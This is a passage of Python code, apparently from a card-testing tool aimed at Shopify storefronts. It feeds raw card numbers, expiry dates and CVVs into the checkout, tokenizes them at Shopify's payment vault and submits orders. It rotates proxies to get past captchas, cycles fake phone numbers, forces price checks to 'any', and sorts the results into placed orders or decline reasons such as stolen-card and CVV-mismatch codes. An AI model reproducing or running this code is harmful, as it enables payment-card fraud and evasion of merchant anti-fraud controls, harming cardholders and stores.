            # Keywords that confirm it is Shopify Payments (native card processor)
            _SHOPIFY_PAY_KEYWORDS = {
                'shopify payments', 'shopify payment', 'shopifypay',
                'shopify_payments', 'shopify-payments',
            }
            # Keywords that confirm 3rd-party gateways we want to BLOCK
            _BLOCKED_GATEWAY_KEYWORDS = (
                'checkout.com', 'checkout_com', 'stripe',
                'braintree', 'square', 'adyen', 'cybersource',
                'authorize.net', 'authorizenet', 'authorize_net', '2checkout',
                'worldpay', 'paymentcloud', 'nmi ', 'nmi_', 'nmi',
                'paypal', 'razorpay', 'payu', 'cashfree', 'mollie',
                'moneris', 'sagepay', 'opayo',
            )

            def _is_wallet(pm: dict) -> bool:
                name = (pm.get('name') or '').lower()
                handle = (pm.get('handle') or pm.get('paymentMethodIdentifier') or '').lower()
                disp = (pm.get('extensibilityDisplayName') or '').lower()
                combined = f"{name} {handle} {disp}"
                return any(w in combined for w in _WALLET_SKIP)

            def _is_card_provider(pm: dict) -> bool:
                """True if the payment method can process credit/debit cards."""
                typename = pm.get('__typename', '')
                has_brands = bool(pm.get('brands') or pm.get('paymentBrands') or pm.get('creditCardBrands'))
                return typename == 'PaymentProvider' or has_brands

            def _gateway_name(pm: dict) -> str:
                """Return a clean, human-readable gateway name."""
                # Prefer extensibilityDisplayName (merchant-set), fall back to name, then handle
                disp = (pm.get('extensibilityDisplayName') or '').strip()
                name = (pm.get('name') or '').strip()
                handle = (pm.get('handle') or pm.get('paymentMethodIdentifier') or '').strip()

                # Map known handles to canonical names
                _KNOWN = {
                    'shopify_payments': 'Shopify Payments',
                    'shopify-payments': 'Shopify Payments',
                    'stripe': 'Stripe',
                    'braintree': 'Braintree',
                    'checkout': 'Checkout.com',
                    'checkout.com': 'Checkout.com',
                    'paypal': 'PayPal',
                    'square': 'Square',
                    'adyen': 'Adyen',
                    'authorize_net': 'Authorize.Net',
                    'authorize.net': 'Authorize.Net',
                    'authorizenet': 'Authorize.Net',
                    'cybersource': 'Cybersource',
                    'nmi': 'NMI',
                    'worldpay': 'Worldpay',
                    '2checkout': '2Checkout',
                    'paymentcloud': 'PaymentCloud',
                    'razorpay': 'Razorpay',
                    'payu': 'PayU',
                    'cashfree': 'Cashfree',
                    'mollie': 'Mollie',
                    'moneris': 'Moneris',
                    'sagepay': 'SagePay / Opayo',
                    'opayo': 'SagePay / Opayo',
                }
                for key, canonical in _KNOWN.items():
                    if key in handle.lower() or key in name.lower() or key in disp.lower():
                        return canonical

                # Prefer display name if it looks real (not a UUID / handle string)
                if disp and len(disp) < 60 and ' ' in disp:
                    return disp.title()
                if name and len(name) < 60:
                    return name.title()
                if handle:
                    return handle.replace('_', ' ').replace('-', ' ').title()
                return 'Unknown Gateway'

            def _to_usd(amount_str, src_currency):
                try:
                    amt = float(amount_str)
                    rate = get_exchange_rate(src_currency)
                    return round(amt * rate, 2), rate
                except:
                    return 0.0, 1.0

            def _fmt_price(total, prod, tax, ship, sym):
                return f"{sym}{total:.2f} [Prod: {sym}{prod:.2f} | Tax: {sym}{tax:.2f} | Ship: {sym}{ship:.2f}]"

            payment_data = seller_proposal.get('payment', {})
            payment_identifier = None
            gateway = 'Unknown Gateway'
            t_amt = 0.0
            curr_sym = '$'
            _fx_rate = 1.0

            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])

                # Pass 1: Prefer Shopify Payments specifically across all payment methods
                for method in payment_methods:
                    pm = method.get('paymentMethod', {})
                    if _is_wallet(pm):
                        continue
                    gw_name = _gateway_name(pm)
                    gw_lower = gw_name.lower()
                    if any(k in gw_lower for k in _SHOPIFY_PAY_KEYWORDS) and _is_card_provider(pm):
                        payment_identifier = pm.get('paymentMethodIdentifier')
                        gateway = 'Shopify Payments'
                        break

                # Pass 2: If Shopify Payments not found, check if a 3rd-party non-Shopify gateway is present
                if not payment_identifier:
                    for method in payment_methods:
                        pm = method.get('paymentMethod', {})
                        if _is_wallet(pm):
                            continue
                        gw_name = _gateway_name(pm)
                        gw_lower = gw_name.lower()
                        if any(k in gw_lower for k in _BLOCKED_GATEWAY_KEYWORDS):
                            return False, 'DYNAMIC_PRICING_UNSUPPORTED', gw_name, total_price, currency

                # Pass 3: Accept any credit-card provider that isn't a wallet
                if not payment_identifier:
                    for method in payment_methods:
                        pm = method.get('paymentMethod', {})
                        if _is_wallet(pm):
                            continue
                        if not _is_card_provider(pm):
                            continue
                        gw_name = _gateway_name(pm)
                        gw_lower = gw_name.lower()
                        if any(k in gw_lower for k in _BLOCKED_GATEWAY_KEYWORDS):
                            return False, 'DYNAMIC_PRICING_UNSUPPORTED', gw_name, total_price, currency
                        payment_identifier = pm.get('paymentMethodIdentifier')
                        gateway = gw_name
                        break

                # Pass 3: Last resort — anything with an identifier that isn't a wallet
                if not payment_identifier:
                    for method in payment_methods:
                        pm = method.get('paymentMethod', {})
                        if _is_wallet(pm):
                            continue
                        pid = pm.get('paymentMethodIdentifier')
                        if not pid:
                            continue
                        gw_name = _gateway_name(pm)
                        gw_lower = gw_name.lower()
                        if any(k in gw_lower for k in _BLOCKED_GATEWAY_KEYWORDS):
                            return False, 'DYNAMIC_PRICING_UNSUPPORTED', gw_name, total_price, currency
                        payment_identifier = pid
                        gateway = gw_name
                        break

# Compute price from proposal data we already have
                try:
                    _r = get_exchange_rate(currency)
                    orig_total = float(running_total)
                    t_amt = round(orig_total * _r, 2)
                    prod_usd = round(float(subtotal) * _r, 2)
                    tax_usd = round(float(tax_amount_str) * _r, 2)
                    ship_usd = round(float(shipping_amount_str) * _r, 2)
                    _fx_rate = _r
                    
                    parts = [f"Prod: ${prod_usd:.2f}"]
                    if tax_usd > 0:
                        parts.append(f"Tax: ${tax_usd:.2f}")
                    if ship_usd > 0:
                        parts.append(f"Ship: ${ship_usd:.2f}")
                    detail = " | ".join(parts)
                    if currency.upper() == "USD" or _r == 1.0:
                        total_price = f"${t_amt:.2f} [{detail}]"
                    else:
                        total_price = f"${t_amt:.2f} ({orig_total:.2f} {currency}) [{detail}]"
                except Exception:
                    t_amt = 0.0
                    curr_sym = '$'

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency
            
            subtotal_str = subtotal
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            
            # Synchronize variables to prevent desynchronization errors
            json_data['variables']['queueToken'] = queueToken or ''
            if checkpoint_data:
                json_data['variables']['checkpointData'] = checkpoint_data
            
            json_data['variables']['buyerIdentity']['customer']['presentmentCurrency'] = currency
            json_data['variables']['taxes']['proposedTotalAmount']['value']['currencyCode'] = currency
            
            if 'merchandiseLines' in json_data['variables']['merchandise'] and json_data['variables']['merchandise']['merchandiseLines']:
                json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['currencyCode'] = currency
                json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['amount'] = subtotal_str

            if not is_shipping_required:
                # Digital item: use deliveryMethodTypes NONE (matches SubmitForCompletion structure)
                json_data['variables']['delivery']['deliveryLines'] = [{
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True}
                        },
                        'options': {}
                    },
                    'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                    'deliveryMethodTypes': ['NONE'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': True
                }]
                json_data['variables']['delivery']['noDeliveryRequired'] = []
            else:
                if not json_data['variables']['delivery'].get('deliveryLines'):
                    json_data['variables']['delivery']['deliveryLines'] = [{
                        'destination': {
                            'partialStreetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': delivery_strategy if delivery_strategy else '',
                                'customDeliveryRate': False
                            },
                            'options': {}
                        },
                        'targetMerchandiseLines': {
                            'lines': [{'stableId': stableId or '1'}]
                        },
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {
                            'value': {'amount': shipping_amount_str, 'currencyCode': currency}
                        },
                        'destinationChanged': False
                    }]
                else:
                    json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                        'deliveryStrategyByHandle': {
                            'handle': delivery_strategy if delivery_strategy else '',
                            'customDeliveryRate': False
                        },
                        'options': {}
                    }
                    json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                        'lines': [{'stableId': stableId or '1'}]
                    }
                    json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                        'value': {'amount': shipping_amount_str, 'currencyCode': currency}
                    }
                    json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                json_data['variables']['delivery']['noDeliveryRequired'] = []
            
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)

            # Poll for the second proposal to resolve PendingTerms
            for attempt in range(4):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                
                if is_captcha_required(resp_text):
                    # Auto-rotate proxy and retry delivery step once
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        await asyncio.sleep(1.5)
                        continue
                    return False, "Proxy Error: security check on delivery", gateway, total_price, currency
                

                try:
                    second_resp_json = json.loads(resp_text)
                    if 'errors' in second_resp_json:
                        s_errors = second_resp_json.get('errors', [])
                        if any('phone' in (str(e.get('message', '')) + str(e.get('code', ''))).lower() for e in s_errors) and attempt < 3:
                            phone = _get_alternate_phone(phone, country_code, attempt=attempt+1)
                            try:
                                json_data['variables']['payment']['billingAddress']['streetAddress']['phone'] = phone
                                if 'deliveryLines' in json_data['variables']['delivery'] and json_data['variables']['delivery']['deliveryLines']:
                                    if 'streetAddress' in json_data['variables']['delivery']['deliveryLines'][0].get('destination', {}):
                                        json_data['variables']['delivery']['deliveryLines'][0]['destination']['streetAddress']['phone'] = phone
                                if 'shopPayOptInPhone' in json_data['variables']['buyerIdentity']:
                                    json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
                            except Exception:
                                pass
                            await asyncio.sleep(0.2)
                            continue

                    sec_neg = (((second_resp_json.get('data') or {}).get('session') or {}).get('negotiate') or {})
                    sec_errors = sec_neg.get('errors') or []
                    if sec_errors and any('phone' in (str(e.get('code', '')) + str(e.get('localizedMessage', ''))).lower() for e in sec_errors) and attempt < 3:
                        phone = _get_alternate_phone(phone, country_code, attempt=attempt+1)
                        try:
                            json_data['variables']['payment']['billingAddress']['streetAddress']['phone'] = phone
                            if 'deliveryLines' in json_data['variables']['delivery'] and json_data['variables']['delivery']['deliveryLines']:
                                if 'streetAddress' in json_data['variables']['delivery']['deliveryLines'][0].get('destination', {}):
                                    json_data['variables']['delivery']['deliveryLines'][0]['destination']['streetAddress']['phone'] = phone
                            if 'shopPayOptInPhone' in json_data['variables']['buyerIdentity']:
                                json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
                        except Exception:
                            pass
                        await asyncio.sleep(0.2)
                        continue

                    sec_res = sec_neg.get('result') or {}
                    
                    if sec_res.get('__typename') == 'Throttled':
                        queueToken = sec_res.get('queueToken') or queueToken
                        json_data['variables']['queueToken'] = queueToken
                        poll_after = sec_res.get('pollAfter', 0.2)
                        await asyncio.sleep(float(poll_after))
                        continue
                        
                    if sec_res.get('__typename') == 'NegotiationResultAvailable':
                        checkpoint_data = sec_res.get('checkpointData') or checkpoint_data
                        queueToken = sec_res.get('queueToken') or queueToken
                        sec_seller = sec_res.get('sellerProposal') or {}

                        # Update running total & currency
                        sec_running_val = (sec_seller.get('runningTotal') or {}).get('value') or {}
                        sec_running = sec_running_val.get('amount')
                        if sec_running:
                            running_total = str(sec_running)
                        sec_curr = sec_running_val.get('currencyCode')
                        if sec_curr:
                            currency = sec_curr.upper()

                        sec_tot_val = (sec_seller.get('total') or {}).get('value') or {}
                        if sec_tot_val.get('amount'):
                            running_total = str(sec_tot_val.get('amount'))
                            if sec_tot_val.get('currencyCode'):
                                currency = sec_tot_val.get('currencyCode').upper()

                        # Update merchandise subtotal
                        sec_merch_lines = (sec_seller.get('merchandise') or {}).get('merchandiseLines') or []
                        if sec_merch_lines:
                            sec_merch_amt = ((sec_merch_lines[0].get('totalAmount') or {}).get('value') or {}).get('amount')
                            if sec_merch_amt is not None:
                                subtotal = str(sec_merch_amt)

                        # Update tax
                        sec_tax = sec_seller.get('tax') or {}
                        if sec_tax.get('__typename') == 'FilledTaxTerms':
                            _new_tax = ((sec_tax.get('totalTaxAmount') or {}).get('value') or {}).get('amount', '0')
                            # Check tax-included again in 2nd proposal
                            _sec_tax_lines = sec_tax.get('totalTaxLines') or []
                            _sec_included = any(
                                l.get('taxIncluded') or l.get('included')
                                for l in _sec_tax_lines
                            ) if _sec_tax_lines else sec_tax.get('taxIncluded', False)
                            if not _sec_included:
                                tax_amount_str = _new_tax
                                try:
                                    tax_amount = float(tax_amount_str)
                                except:
                                    tax_amount = 0.0

                        # Update discount from 2nd proposal
                        sec_disc = sec_seller.get('discounts') or {}
                        sec_disc_lines = sec_disc.get('discountLines') or []
                        if sec_disc_lines:
                            discount_amount = 0.0
                            for dl in sec_disc_lines:
                                try:
                                    discount_amount += float(((dl.get('amount') or {}).get('value') or {}).get('amount', '0'))
                                except:
                                    pass
                            discount_amount_str = f"{discount_amount:.2f}"

                        # Update shipping from 2nd proposal
                        sec_delivery = sec_seller.get('delivery') or {}
                        if sec_delivery.get('__typename') == 'FilledDeliveryTerms':
                            sec_lines = sec_delivery.get('deliveryLines') or [{}]
                            if sec_lines:
                                delivery_line_id = sec_lines[0].get('id', delivery_line_id)
                                sec_strategies = sec_lines[0].get('availableDeliveryStrategies') or []
                                if sec_strategies:
                                    delivery_strategy, shipping_amount_str, shipping_amount, shipping_name = _pick_best_strategy(sec_strategies)
                        break
                except Exception:
                    pass
                if attempt < 3:
                    await asyncio.sleep(0.2)
            
            # ── FINAL PRICE (most accurate, after all proposals resolve) ──────
            try:
                _r = get_exchange_rate(currency)
                final_prod_orig = float(subtotal)
                final_tax_orig = float(tax_amount_str)
                final_ship_orig = float(shipping_amount_str)
                final_disc_orig = float(discount_amount_str)
                final_total_api_orig = float(running_total)

                # Authoritative checkout total: Shopify API's runningTotal / total is the exact charge
                if final_total_api_orig > 0:
                    final_total_orig = final_total_api_orig
                else:
                    final_total_orig = max(final_prod_orig + final_tax_orig + final_ship_orig - final_disc_orig, 0.0)

                final_prod = round(final_prod_orig * _r, 2)
                final_tax = round(final_tax_orig * _r, 2)
                final_ship = round(final_ship_orig * _r, 2)
                final_disc = round(final_disc_orig * _r, 2)
                final_total = round(final_total_orig * _r, 2)
                t_amt = final_total

                # Build human-readable price string
                parts = [f"Prod: ${final_prod:.2f}"]
                if final_tax > 0:
                    parts.append(f"Tax: ${final_tax:.2f}")
                if final_ship > 0:
                    parts.append(f"Ship: ${final_ship:.2f}")
                elif is_shipping_required and delivery_strategy:
                    parts.append("Ship: FREE")
                elif not is_shipping_required:
                    parts.append("Ship: None (Digital)")
                elif is_shipping_required and not delivery_strategy:
                    parts.append("Ship: Pending")
                if final_disc > 0:
                    parts.append(f"Disc: -${final_disc:.2f}")

                detail = " | ".join(parts)
                if currency.upper() == "USD" or _r == 1.0:
                    total_price = f"${final_total:.2f} [{detail}]"
                else:
                    total_price = f"${final_total:.2f} ({final_total_orig:.2f} {currency}) [{detail}]"
            except Exception as _p_err:
                logger.debug(f"Final price calculation error: {_p_err}")
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    # Normalize 2-digit year to 4-digit (e.g. 26 -> 2026)
                    "year": int(ano) if int(ano) > 100 else int(ano) + 2000,
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Encoding': 'br, zstd, gzip, deflate',
                'Accept-Language': _bp.get('accept_language', 'en-US,en;q=0.9'),
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
                vault_headers['x-checkout-cardsink-caller-identification-signature'] = ident_sig
            
            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
            try:
                token_data = await response.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Proxy Error: Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                await response.read()
                return False, f'Proxy Error: Unable to get payment token: {str(e)}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            if not is_shipping_required:
                _submit_delivery = {
                    'deliveryLines': [{
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            },
                            'options': {}
                        },
                        'targetMerchandiseLines': {
                            'lines': [{'stableId': stableId or '1'}]
                        },
                        'deliveryMethodTypes': ['NONE'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                }
            else:
                _submit_delivery = {
                    'deliveryLines': [{
                        'destination': {
                            'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': delivery_strategy if delivery_strategy else '',
                                'customDeliveryRate': False
                            },
                            'options': {'phone': phone} if phone else {}
                        },
                        'targetMerchandiseLines': {
                            'lines': [{'stableId': stableId or '1'}]
                        },
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {
                            'value': {'amount': shipping_amount_str, 'currencyCode': currency}
                        },
                        'destinationChanged': False
                    }] if has_delivery_lines else [],
                    'noDeliveryRequired': [] if has_delivery_lines else [{'stableId': stableId or '1'}],
                    'useProgressiveRates': True,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }

            if check_only:
                return True, "Site Checked", gateway, total_price, currency
            
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': _submit_delivery,
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {'any': True},
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': tax_amount_str, 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'cartMetafields': []
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            for attempt in range(4):
                submit_json_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': submit_variables,
                    'operationName': 'SubmitForCompletion'
                }
                
                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
                )
                
                
                if not response:
                    # Transient network failure on submit — retry if we have attempts left
                    if attempt < 3:
                        await asyncio.sleep(0.8 * (attempt + 1))
                        continue
                    break
                    
                if is_captcha_required(text):
                    # Auto-rotate proxy and retry submit step once
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        await asyncio.sleep(1.5)
                        continue
                    return False, "Proxy Error: security check on submit", gateway, total_price, currency

                # If price or delivery changed dynamically, set amounts to 'any' and retry
                if any(phrase in text for phrase in (
                    "Your order total has changed.",
                    "delivery details may have changed",
                    "Delivery options have changed",
                    "shipping options have changed",
                    "delivery method is not available",
                )):
                    try:
                        submit_variables['input']['payment']['paymentLines'][0]['amount'] = {'any': True}
                        if 'totalAmount' in submit_variables['input']['payment']:
                            submit_variables['input']['payment']['totalAmount'] = {'any': True}
                        submit_variables['input']['taxes']['proposedTotalAmount'] = {'any': True}
                        if 'merchandiseLines' in submit_variables['input']['merchandise'] and submit_variables['input']['merchandise']['merchandiseLines']:
                            submit_variables['input']['merchandise']['merchandiseLines'][0]['expectedTotalPrice'] = {'any': True}
                        if 'deliveryLines' in submit_variables['input']['delivery'] and submit_variables['input']['delivery']['deliveryLines']:
                            submit_variables['input']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'any': True}
                    except Exception:
                        pass
                    if attempt < 3:
                        await asyncio.sleep(0.3)
                        continue
                    return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                if "The requested payment method is not available." in text:
                    return False, "Payment method not available", gateway, total_price, currency
                
                try:
                    resp_json = json.loads(text)
                    submit_data = (resp_json.get('data') or {}).get('submitForCompletion', {})
                    
                    if not submit_data:
                        errors = resp_json.get('errors', [])
                        if errors:
                            for error in errors:
                                code = error.get('code')
                                if code:
                                    return False, code, gateway, total_price, currency
                                msg = error.get('message')
                                if msg:
                                    return False, f"GQL Err: {msg}", gateway, total_price, currency
                        return False, f"Empty submit response: {text[:50]}", gateway, total_price, currency
                    
                    result_type = submit_data.get('__typename', '')
                    
                    if result_type == 'Throttled':
                        queueToken = submit_data.get('queueToken') or queueToken
                        submit_variables['input']['queueToken'] = queueToken
                        poll_after = submit_data.get('pollAfter', 2.0)
                        if attempt < 3:
                            await asyncio.sleep(float(poll_after))
                            continue
                        else:
                            return False, "Throttled on submit", gateway, total_price, currency
                            
                    if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                        receipt = submit_data.get('receipt', {})
                        if receipt:
                            receipt_type = receipt.get('__typename', '')
                            
                            if receipt_type == 'ProcessedReceipt':
                                return True, "ORDER_PLACED", gateway, total_price, currency
                            
                            rid = receipt.get('id')
                            if not rid:
                                return True, "ORDER_PLACED", gateway, total_price, currency
                        else:
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        break
                    
                    elif result_type in ('SubmitFailed', 'SubmitRejected'):
                        # No debug file write — it kills throughput
                        errors = submit_data.get('errors', [])
                        reason = submit_data.get('reason', '')
                        localized = submit_data.get('localizedMessage', '') or submit_data.get('nonLocalizedMessage', '')
                        check_text = f"{reason} {localized}".lower()

                        if result_type == 'SubmitFailed':
                            is_recoverable_fail = any(phrase in check_text for phrase in [
                                "delivery", "shipping", "order total", "total has changed",
                                "rate has changed", "options have changed", "options changed",
                                "delivery details may have changed", "delivery method"
                            ])
                            if not (is_recoverable_fail and attempt < 3):
                                msg = localized or extract_clean_response(reason) or 'CARD_DECLINED'
                                return False, msg, gateway, total_price, currency
                            has_recoverable_error = True
                        else:
                            has_recoverable_error = False
                        if errors:
                            recoverable_codes = {
                                'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
                                'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                                'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
                                'REQUIRED_ARTIFACTS_UNAVAILABLE',
                                'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH',
                                'MERCHANDISE_EXPECTED_PRICE_MISMATCH',
                                'DESTINATION_ADDRESS_REQUIRED',
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
                                'DELIVERY_COMPANY_REQUIRED',
                                'TAX_NEW_TAX_MUST_BE_ACCEPTED',
                                'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
                                'MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION',
                                'PAYMENTS_ZONE_NOT_FOUND',
                                'WAITING_PENDING_TERMS',
                                'DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                'PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                'PHONE_NUMBER_INVALID',
                                'DELIVERY_PHONE_NUMBER_INVALID',
                                'BUYER_IDENTITY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                'BILLING_ADDRESS_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
                                'MISSING_CREDIT_CARD_SESSION_INFORMATION',
                                'PAYMENTS_CREDIT_CARD_SESSION_EXPIRED'
                            }
                            # Hard card-level errors — these mean the card itself
                            # is bad. Never enter recovery when these are present;
                            # return the real decline reason immediately.
                            hard_card_error_codes = {
                                'PAYMENTS_CREDIT_CARD_EXPIRED',
                                'PAYMENTS_CREDIT_CARD_GENERIC',
                                'PAYMENTS_CREDIT_CARD_GENERIC_DECLINE',
                                'PAYMENTS_CREDIT_CARD_CARD_DECLINED',
                                'PAYMENTS_CREDIT_CARD_VELOCITY_EXCEEDED',
                                'PAYMENTS_CREDIT_CARD_STOLEN_CARD',
                                'PAYMENTS_CREDIT_CARD_PICK_UP_CARD',
                                'PAYMENTS_CREDIT_CARD_CVV_MISMATCH',
                                'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
                                'PAYMENT_AMOUNT_TOO_SMALL',
                                'CARD_DECLINED',
                                'PAYMENT_FAILED',
                            }
                            has_hard_card_error = False
                            hard_card_msg = None
                            has_recoverable_error = False
                            for error in errors:
                                code = error.get('code', '')
                                emsg = (error.get('localizedMessage', '') or
                                        error.get('nonLocalizedMessage', '') or '').lower()
                                if code in hard_card_error_codes:
                                    has_hard_card_error = True
                                    hard_card_msg = code
                                    break
                                if (code in recoverable_codes or
                                    "total has changed" in emsg or
                                    "delivery details" in emsg or
                                    "phone" in emsg or
                                    "currency" in emsg or
                                    "price" in emsg or
                                    "format" in emsg or
                                    "session" in emsg or
                                    code == 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT'):
                                    has_recoverable_error = True

                            # If the card itself is bad — return immediately,
                            # don't waste 3 retries on a broken card.
                            if has_hard_card_error:
                                return False, hard_card_msg or "CARD_DECLINED", gateway, total_price, currency

                        if has_recoverable_error and attempt < 3:
                            seller_prop = submit_data.get('sellerProposal')
                            if not seller_prop and errors:
                                for err in errors:
                                    if isinstance(err, dict) and err.get('sellerProposal'):
                                        seller_prop = err.get('sellerProposal')
                                        break
                            if seller_prop:
                                # Extract new currency if currency code changed
                                new_currency = None
                                total_data = seller_prop.get('total') or {}
                                if total_data:
                                    new_currency = (total_data.get('value') or {}).get('currencyCode')
                                if not new_currency:
                                    running_total_data = seller_prop.get('runningTotal') or {}
                                    if running_total_data:
                                        new_currency = (running_total_data.get('value') or {}).get('currencyCode')
                                if not new_currency:
                                    seller_merch = seller_prop.get('merchandise') or {}
                                    if seller_merch:
